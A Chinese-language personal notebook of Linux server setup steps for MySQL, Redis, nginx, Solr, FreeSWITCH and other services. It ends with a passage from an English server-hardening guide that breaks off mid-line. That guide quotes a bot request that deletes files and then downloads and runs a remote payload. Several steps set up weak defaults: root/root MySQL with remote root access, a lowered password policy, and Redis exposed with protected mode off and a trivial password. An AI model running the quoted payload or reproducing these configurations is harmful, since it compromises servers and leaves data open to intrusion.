下的用户目录都是中文的，在终端操作很不方便，需要切换输入法。而且纯命令行界面，中文文件夹会乱码，根本不知道是哪个是哪个。 打开终端，在终端中输入命令：\n1 2 export LANG=en_US xdg-user-dirs-gtk-update 跳出对话框询问是否将目录转化为英文路径，同意并关闭。 在终端中输入命令： export LANG=zh_CN 关闭终端，重启系统。下次进入系统，系统会提示是否把转化好的目录改回中文，选择不再提示，并取消修改(保留旧的，旧的就是重启之前改好的英文文件夹)。这样就完成了\nLinuxMint弃坑 没有必要换linux。我使用过7年Linux桌面。想到哪说到哪吧 首先，Linux下开发用的应用软件奇缺，质量普遍不高，基本都只是凑合能用。除了jetbrain家的软件是良心系列，其他应用软件，良心的真是少之又少。 比如MySQL工具，就没有Windows上的好。mysql workbench不稳定，界面难用，而且有bug（使用mysql proxy会遇到），可能导致无法连接数据库。Navicat也只有wine版，默认连中文都处理不好，也很卡。那些说mycli的装逼犯，就让他装逼吧。基于Java的那几个MySQL工具，问题也不少。我现在是dbvis+mysql workbench凑合远程终端也没有能超越xshell的存在。 聊天工具QQ，钉钉，微信，也只是勉强能用的地步（比如wine qq不支持边缘吸附，网页版钉钉不支持查看加密消息。。）。输入法极其难用，Linux下有搜狗输入法算是最好的中文输入法了（那些说rime的装逼犯你别管），但是这货内存泄漏很严重，时不时就占据个四五G内存。 WPS嘛，勉强能用，但是WPS不支持公式啊，图表也巨丑啊，或许一般场景呢是够了。 对新硬件支持也差。 还有，依赖关系是巨坑。装一个软件，引入一大堆软件，卸载软件也很容易搞崩系统（那些否认的你别理）。虽说有了flatpak格式，但是这个东西还没普及，而且占用空间远比windows大。如图，一个小小的截图，190M体积，在Windows下，只要1%的体积。\n环境搭建 需要安装什么 安装jdk 安装docker 通过docker安装mysql 通过docker安装zookeeper 安装redis 安装tomcat(为了安装jenkins) war包安装jenkins 安装maven 安装git 安装nginx jdk 可以选择卸载系统自带的OpenJDK以及相关的java文件，不卸载也没关系，直接修改/etc/profile即可。 检查是否安装了jdk： java -version 可能已经安装openJDK，这里需要先卸载掉： rpm -qa | grep java 命令说明： rpm：管理套件 -qa：使用询问模式，查询所有套件 grep：查找文件里符合条件的字符串 java：查找包含java字符串的文件\n把在检查出的列表中前缀带java的文件全部删除。 完整的删除文件的命令，在命令窗口键入： rpm -e --nodeps java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64 命令介绍： rpm：管理套件 -e：删除指定的套件 –nodeps：不验证套件档的相互关联性\n检查是否删除成功，再次输入： java -version command not found 代表删除成功，如果还没有删除，则用yum -y remove去删除他们。\n普通方式安装JDK 官网下载jdk1.8linux安装包 下载Linux64...x64.tar.gz这个包，只有这一个包符合我们的要求。 下载完通过FileZilla上传到服务器的理想位置，我上传到/usr/local/src。 然后再复制到/usr/local，这里是我们的安装位置。cp jdk-8u211-linux-x64.tar.gz /usr/local 解压：tar -zxvf jdk-8u211-linux-x64.tar.gz 删除JDK压缩包：rm -f jdk-8u211-linux-x64.tar.gz 编辑全局变量：vim /etc/profile\n1 2 3 4 #java environment export JAVA_HOME=/usr/local/jdk1.8.0_211 export CLASSPATH=.:${JAVA_HOME}/jre/lib/rt.jar:${JAVA_HOME}/lib/dt.jar:${JAVA_HOME}/lib/tools.jar export PATH=$PATH:${JAVA_HOME}/bin 注意修改为自己的jdk安装路径，然后保存退出。 让刚刚设置的环境变量生效source /etc/profile 检查是否配置成功java -version，出现版本号证明成功。 注意：JDK安装在哪个用户下，就是给哪个用户使用。 参考地址\nmysql docker安装mysql 查看docker仓库中的mysql版本： docker search mysql 可从DockerHub上查看可下载的mysql版本 也可参照dockerHub上mysql的文档来安装 也可以通过Dockerfile构建mysql\n我们下载5.7版本： docker pull mysql:5.7\n查看docker镜像： docker images | grep mysql\n根据镜像说明可知： 默认的配置文件是：/etc/mysql/my.cnf 默认的数据目录是：/var/lib/mysql\n创建实例并启动：\n1 2 3 4 5 6 docker run -p 3306:3306 --name mysql \\ -v /mydata/mysql/log:/var/log/mysql \\ -v /mydata/mysql/data:/var/lib/mysql \\ -v /mydata/mysql/conf:/etc/mysql \\ -e MYSQL_ROOT_PASSWORD=root \\ -d mysql:5.7 参数说明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 -p 3306:3306 将容器的 3306 端口映射到主机的 3306 端口 -v /mydata/mysql/conf:/etc/mysql 将配置文件夹挂载到主机 -v /mydata/mysql/log:/var/log/mysql 将日志文件夹挂载到主机 -v /mydata/mysql/data:/var/lib/mysql/ 将配置文件夹挂载到主机 -e MYSQL_ROOT_PASSWORD=root 初始化 root 用户的密码，在云服务器上，不要使用root当密码，很危险 创建并编辑mysql的配置文件： vim /mydata/mysql/conf/my.cnf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 [client] default-character-set = utf8mb4 [mysql] default-character-set = utf8mb4 [mysqld] #服务Id唯一 server-id = 1 port = 3306 log-error = /var/log/mysql/error.log #只能用IP地址 skip_name_resolve character-set-client-handshake = FALSE #数据库默认字符集 character-set-server = utf8mb4 #数据库字符集对应一些排序等规则 collation-server = utf8mb4_general_ci #设置client连接mysql时的字符集,防止乱码 init_connect='SET NAMES utf8mb4' #最大连接数 max_connections = 1000 #解决only_full_group_by问题 sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION #时区 default-time_zone = '+8:00' #内存监控 performance_schema_instrument ='memory%=counted' # 跳过域名解析，可以解决MySQL连接慢的问题 skip-name-resolve #慢查询日志 #slow_query_log= on #long_quert_time= 2 #slow-query-log-file = /home/mysql-slow-log.log 通过容器的 mysql 命令行工具连接 docker exec -it mysql mysql -uroot -proot\n设置 root 远程访问 grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option; flush privileges;\n如果服务器开放了3306端口，那么现在可以通过 navicat 远程连接mysql了。\n普通方式安装 官网下载mysql安装包 拉到页面下方，下拉选Select Operating System，选择Linux-Generic，Select OS Version选择64位。如果不想下载8.0，可以选择右侧的Looking for the latest GA version?，会出现mysql5.7版本。 下载最下边的Linux - Generic (glibc 2.12) (x86, 64-bit), TAR，下载完，上传到linux服务器/usr/local/src位置。 或使用wget获取安装包： wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.28-linux-glibc2.12-x86_64.tar.gz\n解压缩：tar -zxvf mysql-5.7... 重命名：mv mysql-5.7... mysql 在mysql根目录创建data文件夹：mkdir data 创建mysql的用户组和用户，并对mysql目录设置用户组和用户：\n1 2 3 4 5 6 groupadd mysql useradd mysql -g mysql cd mysql pwd:/usr/local/mysql chown -R mysql . chgrp -R mysql . 初始化mysql并启动mysql服务： cd /usr/local/mysql\n初始化： ./bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data 报错： error while loading shared libraries: libnuma.so.1: cannot open shared object file: No such file or directory\n如果已经安装了libnuma.so.1，先执行 yum remove libnuma.so.1\n然后安装64位版本： yum -y install numactl.x86_64\n还是上边的报错，执行： yum install -y libaio 或执行： yum install -y libaio.so.1\n然后执行上边的初始化指令，最后提示如下初始化成功： A temporary password is generated for root@localhost: C(tSgbIuh4yy 最后提示的是默认的密码。\n然后修改下权限，把除了data外的所有mysql文件的权限都设置为root：\n1 2 chown -R root . chown -R mysql data 然后修改mysql配置文件（如果没有自己创建）： vi /etc/my.cnf 或是这么找：find / -type f -name 'my.cnf'\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 [mysqld] basedir=/usr/local/mysql datadir=/usr/local/mysql/data socket=/usr/local/mysql/tmp/mysql.sock # 取消密码验证，一会改完密码这段还要注释掉 skip-grant-tables #服务Id唯一 server-id = 1 port = 3306 log-error = /var/log/mysql/error.log #只能用IP地址 skip_name_resolve character-set-client-handshake = FALSE #数据库默认字符集 character-set-server = utf8mb4 #数据库字符集对应一些排序等规则 collation-server = utf8mb4_general_ci #设置client连接mysql时的字符集,防止乱码 init_connect='SET NAMES utf8mb4' #最大连接数 max_connections = 1000 #解决only_full_group_by问题 sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION #时区 default-time_zone = '+8:00' #内存监控 performance_schema_instrument ='memory%=counted' #慢查询日志 #slow_query_log= on #long_quert_time= 2 #slow-query-log-file = /home/mysql-slow-log.log [client] socket=/usr/local/mysql/tmp/mysql.sock default-character-set = utf8mb4 [mysqld_safe] #log-error=/var/log/mariadb/mariadb.log #pid-file=/var/run/mariadb/mariadb.pid basedir=/usr/local/mysql datadir=/usr/local/mysql/data socket=/usr/local/mysql/tmp/mysql.sock port=3306 sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES # # include all files from the config directory # !includedir /etc/my.cnf.d basedir就是mysql根目录，datadir就是上面在mysql根目录中新建的data文件夹。 socket我在mysql根目录中新建了一个tmp文件夹，然后这里就指向了它，mysql.sock这个文件在启动mysql时会自动创建，所以只要新建tmp文件夹就行了。\n修改tmp文件夹权限： chown -R mysql:mysql tmp\n将mysql加入服务 cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql 开机启动 chkconfig mysql on 启动mysql service mysql start\n还有一些启动方式作为参考：\n1 2 #/etc/init.d/mysql start 或者 ./bin/mysqld_safe\u0026 #/etc/init.d/mysql stop 或者 ./bin/mysqladmin -u root -p shutdown 可以使用./bin/mysqld_safe\u0026命令启动mysql服务，启动后检查下ps -ef|grep mysql检查下是否启动 启动： ./bin/mysqld_safe\u0026 见到如下内容说明启动成功：\n1 2 3 [1] 30706 [root@VM_0_12_centos mysql-5.7]# Logging to '/usr/local/mysql-5.7/data/VM_0_12_centos.err'. 2019-06-09T01:55:28.047197Z mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql-5.7/data 输入bg后台运行，然后再运行ps -ef|grep mysql检查可以看到mysql已经启动了。\n连接mysql： /usr/local/mysql/bin/mysql -u root -p\n报错： mysql: [ERROR] unknown variable 'symbolic-links=0'\n查看my.cnf文件，文件中 # Disabling symbolic-links is recommended to prevent assorted security risks symbolic-links=0 应该是分两行展示了，修改该行为一行显示。\n再次链接Mysql(由于/etc/my.cnf中设置了取消密码验证，所以此处密码直接回车即可)： /usr/local/mysql/bin/mysql -u root -p\n输入默认密码报错： Can't connect to local MySQL server through socket '/usr/local/mysql-5.7/tmp/mysql.sock' (2) 此时需要检查配置文件vi /etc/my.cnf，socket文件路径是否正确，tmp文件夹是否已经创建。\n成功登录mysql，执行sql报错： You must reset your password using ALTER USER statement before executing this statement.\n设置密码： 操作mysql数据库 use mysql;\n修改root用户的密码： update user set authentication_string=password('你的密码') where user='root'; flush privileges; exit;\n将/etc/my.cnf中的skip-grant-tables删除，然后登录再次设置密码（不知道为啥如果不再次设置密码就操作不了数据库了） /usr/local/mysql/bin/mysql -u root -p\n执行如下sql： alter user 'root'@'localhost' identified by '修改后的密码'; 注意mysql_5.7之前的版本需要把authentication_string替换为：password\n允许远程连接\n1 2 3 4 5 /usr/local/mysql/bin/mysql -u root -p use mysql; update user set host='%' where user = 'root'; flush privileges; eixt; 添加快捷方式(可选) ln -s /usr/local/mysql/bin/mysql /usr/bin\n忘记root密码怎么办？ 编辑配置文件：vi /etc/my.cnf\n在[mysqld]下面添加一条命令：skip-grant-tables 保存退出，开始修改root密码：\n进入MySql控制台（直接按回车，这时不需要输入root密码。） mysql -uroot -p\n切换到mysql数据库 mysql\u003euse mysql;\n修改mysql数据库中root的密码 update user set authentication_string=password(“填入新密码”) where user=‘root’;\n刷新mysql权限 flush privileges;\n退出 exit;\n再次vi /etc/my.cnf。把skip-grant-tables删除掉。保存退出。完成MySql root密码的修改。\n为root用户赋予权限： grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option; 注意修改identified by后边的密码。\n可能会报错： Your password does not satisfy the current policy requirements\n这时修改密码级别： set global validate_password_policy=0; set global validate_password_length=4;\n然后执行赋权语句成功，刷新权限： flush privileges;\n重启mysql服务： service mysql restart\n参考地址\ntomcat 官网下载： https://tomcat.apache.org/download-90.cgi 找到Core下的tar.gz包下载并上传到/usr/local 目录下。\n到usr/local目录下解压： tar -zxvf apache-tomcat-9.0.1.tar.gz\ntomcat默认端口是8080，这里为了防止和其他任务端口冲突，我们将端口修改为合适的端口。 cd到/tomcat/conf，vi server.xml，找到Connector port=\"8080\"的位置，修改为恰当的端口。\ncd到tomcat的bin目录下： cd ../bin，启动tomcat./startup.sh，看到日志末尾Tomcat started，说明tomcat启动成功。\n查看tomcat日志： tail -f logs/catalina.out\n若远程无法访问，可能需要在阿里云控制台添加端口白名单。或者是防火墙。\nwget 下载 找到合适的版本https://mirrors.cnnic.cn/apache/tomcat/ 通过wget直接下载tomcat。 http://mirrors.cnnic.cn/apache/tomcat/tomcat-9/v9.0.58/bin/apache-tomcat-9.0.58.tar.gz\ngit 先确认是否安装了git： rpm -qa|grep git 如果安装了需要先卸载： rpm -e --nodeps git 或者 rpm -e git\n不要用yum install git安装git，版本不可控。\n先去git官方下载源码： https://github.com/git/git\n下载最新的tar.gz wget https://github.com/git/git/archive/v2.35.1.tar.gz\n解压到理想位置： tar -zxvf git-2.3.51\n编译源码之前，先安装需要的依赖\n1 yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker 安装依赖时，yum自动安装了Git，所以需要卸载旧版本Git，命令为：\nyum remove git 出现提示输入y即可。\n进入解压后的文件夹，命令cd git-2.35.1\n然后执行编译，命令为 make prefix=/usr/local/git all 耐心等待编译完成。\n安装Git至/usr/local/git路径，命令为 make prefix=/usr/local/git install\n配置环境变量 vim /etc/profile\n在底部加上git的配置信息： export PATH=$PATH:/usr/local/git/bin\n刷新配置文件 source /etc/profile\n或使用指令查看是否安装成功： git --version\nmaven 到理想目录下载maven：\n1 wget https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.8.4/binaries/apache-maven-3.8.4-bin.tar.gz 解压： tar -zxvf apache-maven-3.8.4-bin.tar.gz 改名，方便后面操作： mv apache-maven-3.8.4 maven\n配置环境变量 vim /etc/profile，在合适的位置添加如下内容： M2_HOME=/usr/local/maven export PATH=${M2_HOME}/bin:${PATH} 修改为自己maven的安装路径\n然后使配置文件生效： source /etc/profile\n检查是否安装成功 mvn -v 出现版本号：Apache Maven 3.3.9...，证明安装成功。\nzookeeper 下载地址 下载stable版本。\n将下载好的.gz解压并复制到想要的位置。如：/usr/local/install 或 /home/wjy/install\n在zk的根目录创建两个文件夹data和data_log，分别用来存放zk的数据以及日志。然后进入到data目录，使用pwd指令查看并复制data目录的绝对路径。\n进入zookeeper的conf目录下，复制zoo_sample.cfg为zoo.cfg cp zoo_sample.cfg zoo.cfg\n然后编辑zoo.cfg，修改或新增下面两行配置：\n1 2 dataDir=/home/wjy/install/zookeeper-3.4.13/data dataLogDir=/home/wjy/install/zookeeper-3.4.13/data_log 保存并退出。\nzoo.cfg只存放了单机的配置，想配置集群需要在最后面加上其他服务器的ip和端口。\n到zk的bin目录下启动： ./zkServer.sh start\n查看状态 ./zkServer.sh status\n1 2 3 ZooKeeper JMX enabled by default Using config: /home/wjy/install/zookeeper-3.4.13/bin/../conf/zoo.cfg Mode: standalone 出现上边的状态说明启动成功。 standalone：单机\ndocker安装zookeeper 查看zookeeper镜像 docker search zookeeper 拉取镜像 docker pull zookeeper 构建zookeeper容器 docker run --name=zookeeper -p 2181:2181 -d --privileged zookeeper –name：指定容器别名为zookeeper -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 -d: 后台运行容器，并返回容器ID -v /mysoft/zookeeper/data/:/data/ ：将宿主机的目录挂在到该镜像\nredis https://redis.io/ 官网下载，解压并复制到想要的位置 /home/wjy/install\ncd到redis根目录下，执行 make 报错：\n1 2 3 net.c:36:23: fatal error: sys/types.h: No such file or directory(没有那个文件或目录) ... adlist.c:32:20: fatal error: stdlib.h: No such file or directory 原因是缺少文件，执行以下命令后再次make： sudo apt-get install libc6-dev\n还是报错: zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory\n原因是libc不是默认的分配器，在make后添加参数解决： sudo make MALLOC=libc\n等待执行完成，到redis/src目录下，执行 ./redis-server 出现端口号和进程PID，证明启动成功。\n通过上边的指令启动redis，ctrl+c推出窗口，redis也会关闭，可以在指令后加上\u0026 ./redis-server \u0026 按ctrl + C 可退出redis 启动窗口，此时redis　并不会关闭，而是会再后台运行，可通过命令查看: ps aux | grep redis\n停止redis报错 NOAUTH Authentication required\n停止redis 通过源码安装的redis，只能通过这种方式停止，或使用kill -9 ./redis-cli -h 你的ip -p 6379 -a 你的密码 shutdown\n给redis添加密码 临时密码(redis重启之后会失效) 首先启动redis服务，然后进入redis： redis-cli -p 6379 查看当前redis有没有设置密码： config get requirepass\n1 2 1) \"requirepass\" 2) \"\" 为以上显示说明没有密码，那么现在来设置密码： config set requirepass 123456\n提示ok，再次查看当前redis就提示需要密码：\n1 2 3 127.0.0.1:6379\u003e config get requirepass (error) NOAUTH Authentication required. 127.0.0.1:6379\u003e 永久方式 修改redis根目录下的redis.conf文件： vi redis.conf 查找字符串： 命令模式下输入“/字符串”，例如“/Section 3”。 如果查找下一个，按“n”即可。 /requirepass foobared\n在该行下面输入： requirepass 123456 123456是你的密码\n问题：修改并重启redis之后发现配置并没有生效，原来启动时还需要指定配置文件。 ./redis-server ../redis.conf \u0026，然后bg 这样才算是指定了刚才修改的配置文件。\n至于windows下的redis配置文件，同理。\n配置远程链接redis 将redis.conf中的bind 127.0.0.1注释掉，或改成0.0.0.0 找到protected-mode，后边默认是yes，改成no 重启redis。 在windows的cmd或mac的终端输入 redis-cli -h 你的服务器ip -p 6379 -a 你的密码\n远程连接成功。如果还是连不上，请检查你服务器的安全组，是否开放了6379端口。\ndocker安装redis 搜索redis镜像 docker search redis 拉取官方镜像 docker pull redis 检查是否成功 docker images 配置data、conf mkdir /usr/local/docker/redis/data mkdir /usr/local/docker/redis/conf 进入目录 cd /usr/local/docker/redis/conf\n从官网获取 redis.conf 配置文件 wget http://download.redis.io/redis-stable/redis.conf\n修改redis.conf\n1 2 3 4 #bind 127.0.0.1 protected-mode no appendonly yes requirepass yourpassword protected-mode：在没有显示定义 bind 地址（即监听全网断），又没有设置密码 requirepass时，只允许本地回环 127.0.0.1 访问\n构建redis容器： 1 2 3 4 5 6 7 docker run \\ -p 6379:6379 \\ # 端口映射 宿主机:容器 -v /usr/local/docker/redis/data:/data \\ # 映射数据目录 rw 为读写 -v /usr/local/docker/redis/conf/redis.conf:/etc/redis/redis.conf \\ # 挂载配置文件 ro 为readonly --privileged=true \\ # 给与一些权限 --name redis \\ # 给容器起个名字 -d docker.io/redis:latest redis-server /etc/redis/redis.conf # deamon 运行 服务使用指定的配置文件 docker run -p 6379:6379 -v /usr/local/docker/redis/data:/data -v /usr/local/docker/redis/conf/redis.conf:/etc/redis/redis.conf --privileged=true --name redis -d docker.io/redis:latest redis-server /etc/redis/redis.conf\n查看运行是否成功 docker ps -a\n进入Docker容器redis的客户端 docker exec -it 容器ID redis-cli\n查看设置的密码是否成功 auth 刚才设置的密码\nnginx 下载Nginx及相关组件 Linux系统是Centos 6.5 64位，如果不是root用户，切换到root用户下安装 su root 输入密码，密码不显示。\n首先安装所需依赖： yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel\n进入理想目录准备下载： cd /usr/local/src\n下载nginx tar包： wget http://nginx.org/download/nginx-1.17.8.tar.gz\n上边的版本号可能不是最新的，可以去官网找最新的安装包。 注意列表不是有序的，现在是2020年，我在页面搜索2020，就可以看到最近发布的安装包，然后把上边的nginx-1.17.8.tar.gz替换成新的安装包名字。\n解包： tar -xvf nginx-1.17.8.tar.g\n进入nginx目录： cd nginx-1.17.8\n安装： ./configure \u0026\u0026 make \u0026\u0026 make install\n执行完，会在源码上一层，即/usr/local生成名为nginx的目录。\n检查make是否成功，在nginx目录下的sbin目录执行 ./nginx -t\n正常情况的信息输出： nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful\n启动nginx 可以先找一下nginx安装到什么位置上了 whereis nginx nginx: /usr/local/nginx\n进入nginx目录并启动：\n1 2 cd /usr/local/nginx/sbin ./nginx 停止nginx：./nginx -s stop\n在浏览器中输入服务器的ip地址，如：192.168.1.12 成功的花会看到 Welcome to nginx! 如果看不到，那么逐一排查问题。\n配置云服务器的安全组，阿里云默认是没有开启80端口的，需要手动添加。 ping 192.168.1.12，没问题 telnet 192.168.1.12 80，正在链接192.168.1.12…无法打开到主机的连接，在端口80：连接失败。 说明服务器的80端口没有打开，执行命令验证 firewall-cmd --query-port=80/tcp no 显然80端口没有开启。 下面我们开启80端口： firewall-cmd --add-port=80/tcp --permanent –permanent #永久生效，没有此参数重启后失效 重启防火墙 systemctl restart firewalld 然后刷新浏览器\n配置nginx开机启动 vim /etc/rc.d/rc.local\n在下边加入 /usr/local/nginx/sbin/nginx\n参考1 参考2\nmake报错： make: *** No rule to make target build’, needed by default'. Stop. 更新yum yum update\n安装前置库 yum install -y gcc pcre pcre-devel openssl openssl-devel gd gd-devel\n进入nginx根目录重新编译一次参数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ./configure \\ --prefix=/usr/local/nginx \\ --pid-path=/usr/local/nginx/run \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_flv_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-http_image_filter_module \\ --with-debug \\ ok了。\nmake报错参考\nsolr 官网下载最新的solr 下载Binary releases-zip包，下载后上传到服务器/usr/local/src，cp到/usr/local下，解压unzip solr-8.2.0.zip。 进入bin目录，执行./solr -start\n提示：\n1 2 3 4 5 *** [WARN] *** Your Max Processes Limit is currently 63473. It should be set to 65000 to avoid operational disruption. If you no longer wish to see this warning, set SOLR_ULIMIT_CHECKS to false in your profile or solr.in.sh WARNING: Starting Solr as the root user is a security risk and not considered best practice. Exiting. Please consult the Reference Guide. To override this check, start with argument '-force' 根据提示再次执行： ./solr start -force 最后提示： Started Solr server on port 8983 (pid=27222). Happy searching! 证明启动成功，打开服务器访问： 你的ip:8983 就可以看到solr的web页面了。\n如果不能访问，可能是你服务器的端口没开，请设置服务器的安全组。\n创建core 选择左侧CoreAdmin，再选择Add Core，输入核心的名称和实例路径，后边三个默认就好。 点击Add Core提交信息，这里我遇到了一个错误信息，如下： Can't find resource 'solrconfig.xml' in classpath orc 意思是在核心目录下找不到相应的配置文件，解决办法：将下面路径的conf文件夹copy到新创建的core目录下 /usr/local/solr-8.0.0/server/solr/new_core。 /usr/local/solr-8.2.0/server/solr/configsets/_default 执行复制命令 cp -r conf ../../new_core/ 然后再去创建，就成功了。\n给solr添加访问密码 昨天因为没给solr添加访问密码，导致服务器被挖矿病毒攻击，服务器无法访问，数据库无法访问。还好今天把数据恢复了。\n创建并编辑文件 vim /usr/local/solr-8.2.0/server/etc/verify.properties 输入如下内容：\n1 2 #用户名 密码 权限 user:pass,admin 也可以配置多用户：\n1 2 3 4 #用户名 密码 权限 user: pass,admin user1: pass,admin user3: pass,admin 继续编辑文件 vim /usr/local/solr-8.2.0/server/contexts/solr-jetty-context.xml 初始文件内容如下:\n1 2 3 4 5 6 7 8 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE Configure PUBLIC \"-//Jetty//Configure//EN\" \"http://www.eclipse.org/jetty/configure_9_0.dtd\"\u003e /solr-webapp/webapp /etc/webdefault.xml false 添加如下内容，注意要写在Configure标签中：\n1 2 3 4 5 6 7 8 verify—name /etc/verify.properties 继续编辑文件 vim /usr/local/solr-8.2.0/server/solr-webapp/webapp/WEB-INF/web.xml\n找到如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Disable TRACE / TRACE Enable everything but TRACE / TRACE 在下边添加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Solr / admin BASIC verify-name 然后启动solr，就会让输入用户名密码了。\n另外也可以通过solr地址中加入用户名密码的方式登录，直接进入主界面,地址如下： http://user:pass@localhost:8088/solr/\nfreeswitch 安装参考1\n安装参考2\n参考3\nfreeswitch的依赖非常多，如果不安装依赖就开始编译freeswitch，那就遇到更多的问题，安装依赖之后，可以解决90%以上的问题。\n安装依赖命令如下：\n1 2 3 4 5 6 7 yum install -y https://files.freeswitch.org/repo/yum/centos-release/freeswitch-release-repo-0-1.noarch.rpm epel-release yum install -y yum-utils --enablerepo=extras yum install -y yum-plugin-ovl centos-release-scl rpmdevtools yum-utils git wget vim devtoolset-7-gcc* devtoolset-7 libtiff-devel cmake3 libatomic unixODBC unixODBC-devel.x86_64 postgresql-libs postgresql-devel libpqxx-devel yum install -y gcc-c++ autoconf automake libtool ncurses-devel zlib-devel libjpeg-devel openssl-devel e2fsprogs-devel sqlite-devel libcurl-devel pcre-devel speex-devel ldns-devel libedit-devel libxml2-devel libyuv-devel libvpx-devel libvpx2* libdb4* libidn-devel unbound-devel libuuid-devel lua-devel libsndfile-devel yasm-devel 另外有两个比较重新的库需要手动安装，分别是spandsp和sofia-sip\n1 2 3 4 5 6 cd /data # 下载freeswitch git clone -b v1.10.7 https://github.com/signalwire/freeswitch cd /data/freeswitch git clone https://github.com/freeswitch/spandsp.git git clone https://github.com/freeswitch/sofia-sip.git 首先，要先编译spandsp和sofia-sip， 否则freeswitch在configure阶段会报错。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #编译spandsp cd /data/freeswitch/spandsp ./bootstrap.sh ./configure make make install #编译sofia-sip cd /data/freeswitch/sofia-sip ./bootstrap.sh ./configure make make install #添加库的路径到系统 export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig:${PKG_CONFIG_PATH} ldconfig 修改module.conf。\n由于freeswitch支持动态编译和动态加载，一些不需要的模块可以不编译，如：mod_signalwire、mod_av，修改方法：\n找到modules.conf文件，该文件的位置：/data/freeswitch/modules.conf，可以使用命令查找find / -name modules.conf\n找到mod_signalwire和mod_av注释掉，修改如下：\n1 2 #applications/mod_signalwire #applications/mod_av 有了前两步的准备，编译freeswitch基本就不会遇到问题了，命令如下：\n1 2 3 4 5 cd /data/freeswitch ./bootstrap.sh ./configure --enable-portable-binary --prefix=/usr/local/freeswitch --with-gnu-ld --with-python --with-openssl --enable-core-odbc-support --enable-zrtp make make install 编译如果出现问题，一般是多编译了不需要的模块，所以根据提示依次在modules.conf注释掉这些模块后，再次编译即可。\nfreeswitch安装完成之后，下一步就是启动freeswitch并验证可用性了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ===============启动命令================ #详细启动日志并进入控制台模式命令 freeswitch -c -nonat -rp #退出详细模式启动命令 shutdown #后台启动freeswitch服务（推荐使用） freeswitch -nc -nonat #进入控制台模式命令 fs_cli #退出控制台命令 /exit #关闭freeswitch命令 freeswitch -stop ===============查询服务命令============= #查看freeswitch安装路径 whereis freeswitch 查看进程号 ps -ef | grep freeswithch 查看freeswitch端口是否被监听 netstat -anp | grep 5060 #查看freeswitch的运行状态 status（控制台模式执行） #查看freewitch内置用户是否注册 sofia status profile internal reg（控制台模式执行） 验证必要端口是否启动，检查5060、5066、8021等端口是否启动(还有其他端口，但现在只需要看这几个端口就可以证明freeswitch启动正常了)。\nnetstat -anp |grep freeswitch\nlinux服务器加固指南 The Reluctant Sysadmin’s Guide to Securing a Linux Server (pboyd.io)\nKnow your enemy Before we get into it, we need to know what we’re up against, and first up are bots. As an experiment, I started a VM in AWS and enabled SSH passwords, and started an HTTP server. After only an hour, I had one failed SSH login and a dozen requests for things like:\n1 GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jaws I don’t know what jaws does, but it doesn’t sound friendly. (Hopefully, it’s obvious, but don’t run that–if you really must, I reversed the last octet of the IP address.)\nThese bots scan the Internet looking for any vulnerable systems. The good news is that they’re not out to get you so much as they’re out to get anyone. These attacks are usually easy to stop, keep your host updated, and be a little bit tougher than the next host on their list.\nBut sometimes, there is someone out to get you personally, and sadly no system is truly safe. The best we can do is block what’s known, put up defenses at every layer, and hope we’ve become more trouble than we’re worth. On that cheery note, let’s dive in.\nUpdate the software Even if you just launched it, your system is probably already outdated. There might even be a critical security vulnerability that didn’t make it into the VM image. So to start:\n1 2 sudo apt update sudo apt upgrade Create a user account You should not log in directly as root. Use another account and sudo when you need superuser access. Your cloud VM likely has another account already, which you can use, if you wish. But I prefer to make a new account because the default one tends to be obvious.\n1 2 3 sudo useradd -m -s /bin/bash \\ -G users,sudo \\ alfred Name your account whatever you like, but avoid anything easily guessable, like admin.\nThe -G line lists groups that the user belongs to. The sudo group will grant access to run commands as root (assuming sudo is configured this way, which it usually is).\nYou’ll need a password for this account. You won’t log in with this password, but you will need it for sudo, so pick a good one. Ideally, generate a random one in your password manager. To set the password:\n1 sudo passwd alfred If your VM image disables password logins with SSH, copy the key from the default account to your new account:\n1 2 cp -r ~{admin,alfred}/.ssh chown -R alfred:alfred ~alfred/.ssh/ Log out and back in as your new user and verify that sudo works:\n1 sudo bash -c 'echo \"I am $USER!\"' It should ask for your password. If it works without a password, then run sudo visudo and replace the line that begins with %sudo with:\n1 %sudo 